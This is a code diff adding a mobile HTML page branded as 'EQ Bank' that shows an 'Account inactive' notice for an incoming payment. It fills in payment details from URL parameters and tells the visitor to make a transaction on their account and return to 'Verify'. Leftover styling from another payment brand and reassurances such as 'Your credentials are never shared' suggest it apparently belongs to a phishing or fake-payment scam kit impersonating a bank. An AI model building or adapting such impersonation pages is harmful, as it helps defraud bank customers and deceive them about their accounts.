@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>EQ Bank · Account Inactive</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --eco-blue: #0066A6;
+    --eco-red: #E31E24;
+    --eco-green: #00A651;
+    --eco-navy: #101828;
+    --eco-muted: #667085;
+    --eco-border: #E5E7EB;
+    --eco-soft: #F5F7F9;
+    --eco-bg: #F8FAFC;
+    --eco-amber: #D97706;
+    --eco-amber-soft: #FFF7ED;
+    --eco-amber-border: #FED7AA;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--eco-bg); color: var(--eco-navy);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    min-height: 100vh; padding: 24px 16px 48px;
+  }
+  .wrap { max-width: 440px; margin: 0 auto; }
+
+  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
+  .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
+  .brand .eco { color: var(--eco-blue); }
+  .brand .cash { color: var(--eco-red); }
+  .header .label { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--eco-muted); }
+
+  .card { background: #fff; border-radius: 20px; border: 1px solid var(--eco-border); box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden; }
+
+  .card-body { padding: 28px 22px 24px; text-align: center; }
+
+  .hero-icon {
+    width: 68px; height: 68px; border-radius: 50%;
+    background: var(--eco-amber);
+    display: inline-flex; align-items: center; justify-content: center;
+    margin: 0 auto 18px;
+    box-shadow: 0 0 0 6px rgba(217,119,6,0.12), 0 10px 22px rgba(217,119,6,0.28);
+  }
+  .hero-icon svg {
+    width: 34px; height: 34px;
+    stroke: #fff; fill: none;
+    stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .status-title {
+    font-size: 19px; font-weight: 800; letter-spacing: -0.3px;
+    color: var(--eco-navy); line-height: 1.3; margin-bottom: 8px;
+  }
+  .status-desc {
+    font-size: 13px; color: var(--eco-muted); line-height: 1.6;
+    max-width: 320px; margin: 0 auto 20px;
+  }
+
+  .notice-box {
+    background: var(--eco-amber-soft);
+    border: 1px solid var(--eco-amber-border);
+    border-left: 3px solid var(--eco-amber);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 12.5px;
+    color: #7C2D12;
+    line-height: 1.65;
+    margin-bottom: 18px;
+    text-align: left;
+  }
+  .notice-box strong {
+    color: #9A3412; font-weight: 800; display: block;
+    margin-bottom: 8px; font-size: 13px;
+  }
+  .notice-box ol { margin: 0; padding-left: 18px; }
+  .notice-box ol li { margin-bottom: 6px; }
+  .notice-box ol li:last-child { margin-bottom: 0; }
+  .notice-box .foot-note {
+    display: block; margin-top: 8px; font-size: 11.5px;
+    color: #9A3412; line-height: 1.55;
+  }
+
+  .detail-list {
+    background: var(--eco-soft);
+    border: 1px solid var(--eco-border);
+    border-radius: 12px;
+    padding: 4px 16px;
+    margin-bottom: 22px;
+    text-align: left;
+  }
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    padding: 12px 0; border-bottom: 1px solid #EDEDED;
+    font-size: 12.5px; gap: 12px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .k { color: var(--eco-muted); flex-shrink: 0; font-weight: 500; }
+  .detail-row .v {
+    font-weight: 700; text-align: right;
+    word-break: break-word; color: var(--eco-navy);
+  }
+  .detail-row .v.status-warn { color: var(--eco-amber); font-weight: 700; }
+
+  .close-btn {
+    width: 100%; height: 56px;
+    background: var(--eco-blue); color: #fff;
+    border: none; border-radius: 14px;
+    font-family: inherit; font-size: 15px; font-weight: 800;
+    cursor: pointer;
+    transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .close-btn:hover { filter: brightness(1.08); }
+  .close-btn:active { transform: scale(0.99); }
+
+  .card-foot { padding: 14px 22px 18px; border-top: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
+  .card-foot .brand { font-size: 15px; }
+  .card-foot .small { font-size: 10.5px; color: var(--eco-muted); margin-top: 3px; }
+
+  .page-foot { text-align: center; margin-top: 16px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
+
+  @media (max-width: 360px) {
+    .card-body { padding: 24px 16px 20px; }
+    .hero-icon { width: 60px; height: 60px; }
+    .hero-icon svg { width: 28px; height: 28px; }
+    .status-title { font-size: 17px; }
+    .close-btn { height: 50px; font-size: 14px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="header">
+    <div class="brand"><span class="eco">EQ</span><span class="cash">Bank</span></div>
+    <span class="label">Account status</span>
+  </div>
+
+  <div class="card">
+    <div class="card-body">
+      <div class="hero-icon" aria-hidden="true">
+        <svg viewBox="0 0 24 24">
+          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+          <line x1="12" y1="9" x2="12" y2="13"/>
+          <line x1="12" y1="17" x2="12.01" y2="17"/>
+        </svg>
+      </div>
+
+      <div class="status-title">Account inactive</div>
+      <div class="status-desc">
+        This account is currently inactive. To reactivate it and receive this payment, please complete a transaction on your account.
+      </div>
+
+      <div class="notice-box">
+        <strong>What should you do?</strong>
+        <ol>
+          <li><strong>Make a transaction</strong> on your account (transfer, deposit, or pay a bill)</li>
+          <li>Wait for the <strong>confirmation message</strong> from EQ Bank</li>
+          <li>Come back to this page and <strong>tap "Verify" again</strong></li>
+        </ol>
+        <span class="foot-note">If your account is still inactive after a transaction, contact EQ Bank customer care or visit your nearest branch with your ID.</span>
+      </div>
+
+      <div class="detail-list">
+        <div class="detail-row"><span class="k">Reference</span><span class="v" id="txId">—</span></div>
+        <div class="detail-row"><span class="k">Recipient</span><span class="v" id="recipientName">—</span></div>
+        <div class="detail-row"><span class="k">Amount</span><span class="v" id="amountLabel">—</span></div>
+        <div class="detail-row"><span class="k">Country</span><span class="v" id="countryLabel">—</span></div>
+        <div class="detail-row"><span class="k">Status</span><span class="v status-warn" id="statusLabel">Account inactive</span></div>
+      </div>
+
+      <button class="close-btn" onclick="closePage()">Close</button>
+    </div>
+
+    <div class="card-foot">
+      <div class="brand"><span class="eco">EQ</span><span class="cash">Bank</span></div>
+      <div class="small">Your credentials are never shared.</div>
+    </div>
+  </div>
+
+  <div class="page-foot">
+    Powered by EQ Bank · Secure payment verification
+  </div>
+</div>
+
+<script>
+  const urlParams = new URLSearchParams(location.search);
+
+  const tx = {
+    tx:  urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || 'USD',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || ''
+  };
+
+  const CURRENCY_SYMBOLS = {
+    USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
+    MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
+    UGX: 'USh ', GHS: '₵', SZL: 'E', LRD: 'L$ ', EUR: '€', GBP: '£'
+  };
+
+  function currencySymbol(code) {
+    const c = String(code || 'USD').toUpperCase();
+    return CURRENCY_SYMBOLS[c] || (c + ' ');
+  }
+
+  function formatMoney(amount, currency) {
+    const n = Number(amount);
+    const safe = isFinite(n) ? n : 0;
+    return currencySymbol(currency) + safe.toFixed(2);
+  }
+
+  function populate() {
+    document.getElementById('txId').textContent = tx.tx || '—';
+    document.getElementById('recipientName').textContent = tx.rn || '—';
+    document.getElementById('amountLabel').textContent = tx.am ? formatMoney(tx.am, tx.cur) : '—';
+    document.getElementById('countryLabel').textContent = tx.c || '—';
+  }
+
+  function closePage() {
+    const q = new URLSearchParams({
+      tx: tx.tx,
+      am: tx.am,
+      cur: tx.cur,
+      rn: tx.rn,
+      c: tx.c
+    });
+    window.location.href = 'index.html?' + q.toString();
+  }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closePage();
+  });
+
+  document.addEventListener('DOMContentLoaded', populate);
+</script>
+</body>
+</html>
